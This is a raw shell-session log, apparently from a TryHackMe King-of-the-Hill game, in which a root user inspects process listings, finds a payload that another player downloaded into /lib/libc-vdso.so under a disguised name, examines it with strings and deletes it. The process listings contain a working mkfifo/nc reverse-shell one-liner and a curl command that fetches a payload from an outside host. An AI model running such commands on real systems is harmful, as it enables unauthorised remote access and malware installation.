root        37  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/u31:0]
root        38  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [ecryptfs-kthrea]
root        80  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kthrotld]
root        81  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [acpi_thermal_pm]
root        82  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [scsi_eh_0]
root        83  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [scsi_tmf_0]
root        84  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [scsi_eh_1]
root        85  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [scsi_tmf_1]
root        91  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ipv6_addrconf]
root       100  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kstrp]
root       117  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [charger_manager]
root       167  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ttm_swap]
root       263  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [raid5wq]
root       316  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [jbd2/xvda2-8]
root       317  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ext4-rsv-conver]
root       367  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/0:1H]
root       399  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [iscsi_eh]
root       402  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib-comp-wq]
root       403  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib-comp-unb-wq]
root       404  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib_mcast]
root       405  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib_nl_sa_wq]
root       406  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [rdma_cm]
root       419  0.0  0.0      0     0 ?        S<   22:31   0:00  \_ [loop0]
root       421  0.0  0.0      0     0 ?        S<   22:31   0:00  \_ [loop1]
root      1425  0.0  0.0      0     0 ?        I    22:43   0:00  \_ [kworker/u30:2]
root      1544  0.0  0.0      0     0 ?        I    22:55   0:00  \_ [kworker/u30:1]
root      1591  0.0  0.0      0     0 ?        I    23:00   0:00  \_ [kworker/u30:5]
root      4676  0.0  0.0      0     0 ?        I    23:06   0:00  \_ [kworker/0:2]
root      7578  0.0  0.0      0     0 ?        I    23:11   0:00  \_ [kworker/0:0]
root         1  0.2  0.8 159936  9032 ?        Ss   22:31   0:06 /sbin/init maybe-ubiquity
root       397  0.0  1.8 127776 18956 ?        S<s  22:31   0:01 /lib/systemd/systemd-journald
root       408  0.0  0.1  97708  1832 ?        Ss   22:31   0:00 /sbin/lvmetad -f
root       417  0.1  0.4  45560  4512 ?        Ss   22:31   0:03 /lib/systemd/systemd-udevd
systemd+   508  0.0  0.3 141936  3320 ?        Ssl  22:31   0:00 /lib/systemd/systemd-timesyncd
systemd+   610  0.0  0.5  80056  5180 ?        Ss   22:31   0:00 /lib/systemd/systemd-networkd
systemd+   623  0.0  0.5  70640  5288 ?        Ss   22:31   0:00 /lib/systemd/systemd-resolved
tryhack+   729  0.0  0.3 106640  3604 ?        Ssl  22:31   0:00 /home/tryhackme/img
root       743  0.0  0.6  70856  6300 ?        Ss   22:31   0:00 /lib/systemd/systemd-logind
bread      745  0.0  0.4 107104  5028 ?        Ssl  22:31   0:00 /home/bread/main
bread     1549  0.0  0.3  11616  3172 ?        S    23:00   0:00  \_ /bin/bash -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.11.55.164 1337 >/tmp/f
bread     1556  0.0  0.0   8420   808 ?        S    23:00   0:00      \_ cat /tmp/f
bread     1557  0.0  0.0   6732   900 ?        S    23:00   0:00      \_ sh -i
root      1563  0.0  0.3  19216  3900 ?        S    23:00   0:00      |   \_ -i
root      9068  0.0  0.3  37080  3500 ?        R    23:13   0:00      |       \_ ps aufx
bread     1558  0.0  0.2  17820  2216 ?        S    23:00   0:00      \_ nc 10.11.55.164 1337
syslog     747  0.0  0.4 263036  4368 ?        Ssl  22:31   0:00 /usr/sbin/rsyslogd -n
root       751  0.0  0.3  33996  3360 ?        Ss   22:31   0:00 /usr/sbin/inetd
root       753  0.0  0.1 161076  1676 ?        Ssl  22:31   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root       755  0.0  1.7 169096 17148 ?        Ssl  22:31   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
daemon     756  0.0  0.2  28332  2352 ?        Ss   22:31   0:00 /usr/sbin/atd -f
message+   763  0.0  0.4  50108  4356 ?        Ss   22:31   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root       788  0.0  0.6 286332  6968 ?        Ssl  22:31   0:00 /usr/lib/accountsservice/accounts-daemon
root       789  0.0  0.5 106640  5648 ?        Ssl  22:31   0:00 /root/koth
root       791  0.0  0.3  30028  3100 ?        Ss   22:31   0:00 /usr/sbin/cron -f
root       792  0.3  2.4 557680 24876 ?        Ssl  22:31   0:08 /usr/lib/snapd/snapd
root       800  0.0  1.9 185948 20096 ?        Ssl  22:31   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root       809  0.0  0.2  14664  2248 ttyS0    Ss+  22:31   0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
root       815  0.0  0.1  14888  1904 tty1     Ss+  22:31   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root       816  0.0  0.7 291456  7216 ?        Ssl  22:31   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       819  0.0  0.5  72300  5728 ?        Ss   22:31   0:00 /usr/sbin/sshd -D
root      8521  0.0  0.7 108008  7152 ?        Ss   23:12   0:00  \_ sshd: ramen [priv]
ramen     8623  0.0  0.4 108368  4948 ?        S    23:13   0:00      \_ sshd: ramen@notty
ramen     8649  0.0  0.0   6732   904 ?        Ss   23:13   0:00          \_ /bin/sh
ramen     8848  0.1  0.9  38984  9724 ?        S    23:13   0:00              \_ python3 -c import pty;pty.spawn("/bin/sh")
ramen     8849  0.0  0.0   6732   824 pts/1    Ss   23:13   0:00                  \_ /bin/sh
root      8902  0.0  0.3  61792  3788 pts/1    S+   23:13   0:00                      \_ su -c /bin/sh
root      8903  0.0  0.0   6732   920 ?        Ss   23:13   0:00                          \_ /bin/sh
root      9003  1.0  0.8 105884  8604 ?        S    23:13   0:00                              \_ curl http://10.2.66.237/e14e5906-c255-4e28-a3f1-16b6bb759fb7/oFMzIe --output /lib/libc-vdso.so
mysql      841  0.1 17.5 1161928 176800 ?      Sl   22:32   0:03 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
ramen      956  0.0  0.7  76644  7476 ?        Ss   22:32   0:00 /lib/systemd/systemd --user
ramen      966  0.0  0.2 111792  2448 ?        S    22:32   0:00  \_ (sd-pam)
root      1575  4.7  0.0   1000    56 ?        Ss   23:00   0:36 /li
root      9041  2.0  1.3 722556 13564 ?        Ssl  23:13   0:00 /usr/bin/systemd-pam
cd /lib
ls -lah
total 13M
drwxr-xr-x 22 root root 4.0K Dec  8 23:13 .
drwxr-xr-x 24 root root 4.0K Mar 19  2020 ..
drwxr-xr-x  2 root root 4.0K Aug  5  2019 apparmor
drwxr-xr-x  2 root root 4.0K Aug  5  2019 console-setup
lrwxrwxrwx  1 root root   21 Mar 20  2020 cpp -> /etc/alternatives/cpp
drwxr-xr-x  3 root root 4.0K Mar 19  2020 crda
drwxr-xr-x  4 root root 4.0K Aug  5  2019 cryptsetup
drwxr-xr-x  2 root root 4.0K Aug  5  2019 ebtables
drwxr-xr-x 84 root root  20K Mar 19  2020 firmware
drwxr-xr-x  2 root root 4.0K Aug  5  2019 hdparm
drwxr-xr-x  2 root root 4.0K Aug  5  2019 init
-rwxr-xr-x  1 root root  73K Nov  9  2017 klibc-wBFLvVtxy4xJqEadIBJMa78iJz8.so
-rw-r--r--  1 root root  13M Dec  8 23:13 libc-vdso.so
lrwxrwxrwx  1 root root   18 Apr 18  2018 libhandle.so.1 -> libhandle.so.1.0.3
-rw-r--r--  1 root root  15K Apr 18  2018 libhandle.so.1.0.3
drwxr-xr-x  3 root root 4.0K Aug  5  2019 lsb
drwxr-xr-x  2 root root 4.0K Mar 20  2020 modprobe.d
drwxr-xr-x  3 root root 4.0K Mar 19  2020 modules
drwxr-xr-x  2 root root 4.0K Aug  5  2019 modules-load.d
drwxr-xr-x  2 root root 4.0K Mar 20  2020 netplan
drwxr-xr-x  2 root root 4.0K Aug  5  2019 open-iscsi
drwxr-xr-x  3 root root 4.0K Aug  5  2019 recovery-mode
drwxr-xr-x  8 root root  12K Mar 20  2020 systemd
drwxr-xr-x 15 root root 4.0K Feb 12  2018 terminfo
drwxr-xr-x  4 root root 4.0K Mar 20  2020 udev
drwxr-xr-x  2 root root 4.0K Aug  5  2019 ufw
drwxr-xr-x  4 root root  12K Mar 20  2020 x86_64-linux-gnu
ls -lah libc-vdso.so
-rw-r--r-- 1 root root 16M Dec  8 23:14 libc-vdso.so

cp libc-vdso.so /tmp
cd /tmp
python3 -m http.server 7777 &
ps aufx
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         2  0.0  0.0      0     0 ?        S    22:31   0:00 [kthreadd]
root         4  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/0:0H]
root         6  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [mm_percpu_wq]
root         7  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [ksoftirqd/0]
root         8  0.0  0.0      0     0 ?        I    22:31   0:01  \_ [rcu_sched]
root         9  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [rcu_bh]
root        10  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [migration/0]
root        11  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [watchdog/0]
root        12  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [cpuhp/0]
root        13  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kdevtmpfs]
root        14  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [netns]
root        15  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [rcu_tasks_kthre]
root        16  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kauditd]
root        17  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [xenbus]
root        18  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [xenwatch]
root        19  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [kworker/0:1]
root        20  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [khungtaskd]
root        21  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [oom_reaper]
root        22  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [writeback]
root        23  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kcompactd0]
root        24  0.0  0.0      0     0 ?        SN   22:31   0:00  \_ [ksmd]
root        25  0.0  0.0      0     0 ?        SN   22:31   0:00  \_ [khugepaged]
root        26  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [crypto]
root        27  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kintegrityd]
root        28  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kblockd]
root        29  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ata_sff]
root        30  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [md]
root        31  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [edac-poller]
root        32  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [devfreq_wq]
root        33  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [watchdogd]
root        36  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kswapd0]
root        37  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/u31:0]
root        38  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [ecryptfs-kthrea]
root        80  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kthrotld]
root        81  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [acpi_thermal_pm]
root        82  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [scsi_eh_0]
root        83  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [scsi_tmf_0]
root        84  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [scsi_eh_1]
root        85  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [scsi_tmf_1]
root        91  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ipv6_addrconf]
root       100  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kstrp]
root       117  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [charger_manager]
root       167  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ttm_swap]
root       263  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [raid5wq]
root       316  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [jbd2/xvda2-8]
root       317  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ext4-rsv-conver]
root       367  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/0:1H]
root       399  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [iscsi_eh]
root       402  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib-comp-wq]
root       403  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib-comp-unb-wq]
root       404  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib_mcast]
root       405  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib_nl_sa_wq]
root       406  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [rdma_cm]
root       419  0.0  0.0      0     0 ?        S<   22:31   0:00  \_ [loop0]
root       421  0.0  0.0      0     0 ?        S<   22:31   0:00  \_ [loop1]
root      1425  0.0  0.0      0     0 ?        I    22:43   0:00  \_ [kworker/u30:2]
root      1544  0.0  0.0      0     0 ?        I    22:55   0:00  \_ [kworker/u30:1]
root      1591  0.0  0.0      0     0 ?        I    23:00   0:00  \_ [kworker/u30:5]
root      4676  0.0  0.0      0     0 ?        I    23:06   0:00  \_ [kworker/0:2]
root      7578  0.0  0.0      0     0 ?        I    23:11   0:00  \_ [kworker/0:0]
root      9218  0.0  0.0      0     0 ?        I    23:14   0:00  \_ [kworker/u30:0]
root      9219  0.0  0.0      0     0 ?        I    23:14   0:00  \_ [kworker/u30:3]
root      9220  0.0  0.0      0     0 ?        I    23:14   0:00  \_ [kworker/u30:4]
root         1  0.2  0.8 159936  9056 ?        Ss   22:31   0:07 /sbin/init maybe-ubiquity
root       397  0.0  1.8 127876 19088 ?        S<s  22:31   0:01 /lib/systemd/systemd-journald
root       408  0.0  0.1  97708  1832 ?        Ss   22:31   0:00 /sbin/lvmetad -f
root       417  0.1  0.4  45560  4512 ?        Ss   22:31   0:04 /lib/systemd/systemd-udevd
systemd+   508  0.0  0.3 141936  3320 ?        Ssl  22:31   0:00 /lib/systemd/systemd-timesyncd
systemd+   610  0.0  0.5  80056  5180 ?        Ss   22:31   0:00 /lib/systemd/systemd-networkd
systemd+   623  0.0  0.5  70640  5288 ?        Ss   22:31   0:00 /lib/systemd/systemd-resolved
tryhack+   729  0.0  0.3 106640  3604 ?        Ssl  22:31   0:00 /home/tryhackme/img
root       743  0.0  0.6  70856  6300 ?        Ss   22:31   0:00 /lib/systemd/systemd-logind
bread      745  0.0  0.4 107104  5028 ?        Ssl  22:31   0:00 /home/bread/main
bread     1549  0.0  0.3  11616  3172 ?        S    23:00   0:00  \_ /bin/bash -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.11.55.164 1337 >/tmp/f
bread     1556  0.0  0.0   8420   808 ?        S    23:00   0:00      \_ cat /tmp/f
bread     1557  0.0  0.0   6732   900 ?        S    23:00   0:00      \_ sh -i
root      1563  0.0  0.3  19216  3900 ?        S    23:00   0:00      |   \_ -i
root      9378  0.3  1.7  60372 17120 ?        S    23:14   0:00      |       \_ python3 -m http.server 7777
root      9608  0.0  0.3  37080  3440 ?        R    23:14   0:00      |       \_ ps aufx
bread     1558  0.0  0.2  17820  2216 ?        S    23:00   0:00      \_ nc 10.11.55.164 1337
syslog     747  0.0  0.4 263036  4368 ?        Ssl  22:31   0:00 /usr/sbin/rsyslogd -n
root       751  0.0  0.3  33996  3360 ?        Ss   22:31   0:00 /usr/sbin/inetd
root       753  0.0  0.1 161076  1676 ?        Ssl  22:31   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root       755  0.0  1.7 169096 17148 ?        Ssl  22:31   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
daemon     756  0.0  0.2  28332  2352 ?        Ss   22:31   0:00 /usr/sbin/atd -f
message+   763  0.0  0.4  50108  4356 ?        Ss   22:31   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root       788  0.0  0.6 286332  6968 ?        Ssl  22:31   0:00 /usr/lib/accountsservice/accounts-daemon
root       789  0.0  0.5 106640  5648 ?        Ssl  22:31   0:00 /root/koth
root       792  0.3  2.4 557680 24876 ?        Ssl  22:31   0:08 /usr/lib/snapd/snapd
root       800  0.0  1.9 185948 20096 ?        Ssl  22:31   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root       809  0.0  0.2  14664  2248 ttyS0    Ss+  22:31   0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
root       815  0.0  0.1  14888  1904 tty1     Ss+  22:31   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root       816  0.0  0.7 291456  7216 ?        Ssl  22:31   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       819  0.0  0.5  72300  5728 ?        Ss   22:31   0:00 /usr/sbin/sshd -D
root      8521  0.0  0.7 108008  7152 ?        Ss   23:12   0:00  \_ sshd: ramen [priv]
ramen     8623  0.0  0.4 108368  4948 ?        S    23:13   0:00      \_ sshd: ramen@notty
ramen     8649  0.0  0.0   6732   904 ?        Ss   23:13   0:00          \_ /bin/sh
ramen     8848  0.0  0.9  38984  9724 ?        S    23:13   0:00              \_ python3 -c import pty;pty.spawn("/bin/sh")
ramen     8849  0.0  0.0   6732   824 pts/1    Ss   23:13   0:00                  \_ /bin/sh
root      8902  0.0  0.3  61792  3788 pts/1    S+   23:13   0:00                      \_ su -c /bin/sh
root      8903  0.0  0.0   6732   920 ?        Ss   23:13   0:00                          \_ /bin/sh
mysql      841  0.1 17.5 1161928 176760 ?      Sl   22:32   0:03 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
ramen      956  0.0  0.7  76644  7476 ?        Ss   22:32   0:00 /lib/systemd/systemd --user
ramen      966  0.0  0.2 111792  2448 ?        S    22:32   0:00  \_ (sd-pam)
root      1575  4.7  0.0   1000    56 ?        Ss   23:00   0:39 /li
root      9041  0.0  1.3 722556 13564 ?        Ssl  23:13   0:00 /usr/bin/systemd-pam
root      9253  0.0  1.5 1115248 15108 ?       Ssl  23:14   0:00 /usr/sbin/cron -f
kill 9378
cd /lib
-i: line 196:  9378 Terminated              python3 -m http.server 7777  (wd: /tmp)
ls -lah
total 16M
drwxr-xr-x 22 root root 4.0K Dec  8 23:13 .
drwxr-xr-x 24 root root 4.0K Mar 19  2020 ..
drwxr-xr-x  2 root root 4.0K Aug  5  2019 apparmor
drwxr-xr-x  2 root root 4.0K Aug  5  2019 console-setup
lrwxrwxrwx  1 root root   21 Mar 20  2020 cpp -> /etc/alternatives/cpp
drwxr-xr-x  3 root root 4.0K Mar 19  2020 crda
drwxr-xr-x  4 root root 4.0K Aug  5  2019 cryptsetup
drwxr-xr-x  2 root root 4.0K Aug  5  2019 ebtables
drwxr-xr-x 84 root root  20K Mar 19  2020 firmware
drwxr-xr-x  2 root root 4.0K Aug  5  2019 hdparm
drwxr-xr-x  2 root root 4.0K Aug  5  2019 init
-rwxr-xr-x  1 root root  73K Nov  9  2017 klibc-wBFLvVtxy4xJqEadIBJMa78iJz8.so
-rw-r--r--  1 root root  16M Dec  8 23:14 libc-vdso.so
lrwxrwxrwx  1 root root   18 Apr 18  2018 libhandle.so.1 -> libhandle.so.1.0.3
-rw-r--r--  1 root root  15K Apr 18  2018 libhandle.so.1.0.3
drwxr-xr-x  3 root root 4.0K Aug  5  2019 lsb
drwxr-xr-x  2 root root 4.0K Mar 20  2020 modprobe.d
drwxr-xr-x  3 root root 4.0K Mar 19  2020 modules
drwxr-xr-x  2 root root 4.0K Aug  5  2019 modules-load.d
drwxr-xr-x  2 root root 4.0K Mar 20  2020 netplan
drwxr-xr-x  2 root root 4.0K Aug  5  2019 open-iscsi
drwxr-xr-x  3 root root 4.0K Aug  5  2019 recovery-mode
drwxr-xr-x  8 root root  12K Mar 20  2020 systemd
drwxr-xr-x 15 root root 4.0K Feb 12  2018 terminfo
drwxr-xr-x  4 root root 4.0K Mar 20  2020 udev
drwxr-xr-x  2 root root 4.0K Aug  5  2019 ufw
drwxr-xr-x  4 root root  12K Mar 20  2020 x86_64-linux-gnu
cd /lib
ls -lah
total 16M
drwxr-xr-x 22 root root 4.0K Dec  8 23:13 .
drwxr-xr-x 24 root root 4.0K Mar 19  2020 ..
drwxr-xr-x  2 root root 4.0K Aug  5  2019 apparmor
drwxr-xr-x  2 root root 4.0K Aug  5  2019 console-setup
lrwxrwxrwx  1 root root   21 Mar 20  2020 cpp -> /etc/alternatives/cpp
drwxr-xr-x  3 root root 4.0K Mar 19  2020 crda
drwxr-xr-x  4 root root 4.0K Aug  5  2019 cryptsetup
drwxr-xr-x  2 root root 4.0K Aug  5  2019 ebtables
drwxr-xr-x 84 root root  20K Mar 19  2020 firmware
drwxr-xr-x  2 root root 4.0K Aug  5  2019 hdparm
drwxr-xr-x  2 root root 4.0K Aug  5  2019 init
-rwxr-xr-x  1 root root  73K Nov  9  2017 klibc-wBFLvVtxy4xJqEadIBJMa78iJz8.so
-rw-r--r--  1 root root  16M Dec  8 23:14 libc-vdso.so
lrwxrwxrwx  1 root root   18 Apr 18  2018 libhandle.so.1 -> libhandle.so.1.0.3
-rw-r--r--  1 root root  15K Apr 18  2018 libhandle.so.1.0.3
drwxr-xr-x  3 root root 4.0K Aug  5  2019 lsb
drwxr-xr-x  2 root root 4.0K Mar 20  2020 modprobe.d
drwxr-xr-x  3 root root 4.0K Mar 19  2020 modules
drwxr-xr-x  2 root root 4.0K Aug  5  2019 modules-load.d
drwxr-xr-x  2 root root 4.0K Mar 20  2020 netplan
drwxr-xr-x  2 root root 4.0K Aug  5  2019 open-iscsi
drwxr-xr-x  3 root root 4.0K Aug  5  2019 recovery-mode
drwxr-xr-x  8 root root  12K Mar 20  2020 systemd
drwxr-xr-x 15 root root 4.0K Feb 12  2018 terminfo
drwxr-xr-x  4 root root 4.0K Mar 20  2020 udev
drwxr-xr-x  2 root root 4.0K Aug  5  2019 ufw
drwxr-xr-x  4 root root  12K Mar 20  2020 x86_64-linux-gnu
strings libc-vdso.so
x6Oq
o&4|
JPDn

...snipped large strings output ...

.go.buildinfo
.noptrdata
.bss
.noptrbss
.comment

rm 
rm: missing operand
Try 'rm --help' for more information.

rm libc-vdso.so

ls -lah
total 212K
drwxr-xr-x 22 root root 4.0K Dec  8 23:15 .
drwxr-xr-x 24 root root 4.0K Mar 19  2020 ..
drwxr-xr-x  2 root root 4.0K Aug  5  2019 apparmor
drwxr-xr-x  2 root root 4.0K Aug  5  2019 console-setup
lrwxrwxrwx  1 root root   21 Mar 20  2020 cpp -> /etc/alternatives/cpp
drwxr-xr-x  3 root root 4.0K Mar 19  2020 crda
drwxr-xr-x  4 root root 4.0K Aug  5  2019 cryptsetup
drwxr-xr-x  2 root root 4.0K Aug  5  2019 ebtables
drwxr-xr-x 84 root root  20K Mar 19  2020 firmware
drwxr-xr-x  2 root root 4.0K Aug  5  2019 hdparm
drwxr-xr-x  2 root root 4.0K Aug  5  2019 init
-rwxr-xr-x  1 root root  73K Nov  9  2017 klibc-wBFLvVtxy4xJqEadIBJMa78iJz8.so
lrwxrwxrwx  1 root root   18 Apr 18  2018 libhandle.so.1 -> libhandle.so.1.0.3
-rw-r--r--  1 root root  15K Apr 18  2018 libhandle.so.1.0.3
drwxr-xr-x  3 root root 4.0K Aug  5  2019 lsb
drwxr-xr-x  2 root root 4.0K Mar 20  2020 modprobe.d
drwxr-xr-x  3 root root 4.0K Mar 19  2020 modules
drwxr-xr-x  2 root root 4.0K Aug  5  2019 modules-load.d
drwxr-xr-x  2 root root 4.0K Mar 20  2020 netplan
drwxr-xr-x  2 root root 4.0K Aug  5  2019 open-iscsi
drwxr-xr-x  3 root root 4.0K Aug  5  2019 recovery-mode
drwxr-xr-x  8 root root  12K Mar 20  2020 systemd
drwxr-xr-x 15 root root 4.0K Feb 12  2018 terminfo
drwxr-xr-x  4 root root 4.0K Mar 20  2020 udev
drwxr-xr-x  2 root root 4.0K Aug  5  2019 ufw
drwxr-xr-x  4 root root  12K Mar 20  2020 x86_64-linux-gnu
ps aufx
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         2  0.0  0.0      0     0 ?        S    22:31   0:00 [kthreadd]
root         4  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/0:0H]
root         6  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [mm_percpu_wq]
root         7  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [ksoftirqd/0]
root         8  0.0  0.0      0     0 ?        I    22:31   0:01  \_ [rcu_sched]
root         9  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [rcu_bh]
root        10  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [migration/0]
root        11  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [watchdog/0]
root        12  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [cpuhp/0]
root        13  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kdevtmpfs]
root        14  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [netns]
root        15  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [rcu_tasks_kthre]
root        16  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kauditd]
root        17  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [xenbus]
root        18  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [xenwatch]
root        19  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [kworker/0:1]
root        20  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [khungtaskd]
root        21  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [oom_reaper]
root        22  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [writeback]
root        23  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kcompactd0]
root        24  0.0  0.0      0     0 ?        SN   22:31   0:00  \_ [ksmd]
root        25  0.0  0.0      0     0 ?        SN   22:31   0:00  \_ [khugepaged]
root        26  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [crypto]
root        27  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kintegrityd]
root        28  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kblockd]
root        29  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ata_sff]
root        30  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [md]
root        31  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [edac-poller]
root        32  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [devfreq_wq]
root        33  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [watchdogd]
root        36  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kswapd0]
root        37  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/u31:0]
root        38  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [ecryptfs-kthrea]
root        80  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kthrotld]
root        81  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [acpi_thermal_pm]
root        82  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [scsi_eh_0]
root        83  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [scsi_tmf_0]
root        84  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [scsi_eh_1]
root        85  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [scsi_tmf_1]
root        91  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ipv6_addrconf]
root       100  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kstrp]
root       117  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [charger_manager]
root       167  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ttm_swap]
root       263  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [raid5wq]
root       316  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [jbd2/xvda2-8]
root       317  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ext4-rsv-conver]
root       367  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/0:1H]
root       399  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [iscsi_eh]
root       402  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib-comp-wq]
root       403  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib-comp-unb-wq]
root       404  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib_mcast]
root       405  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib_nl_sa_wq]
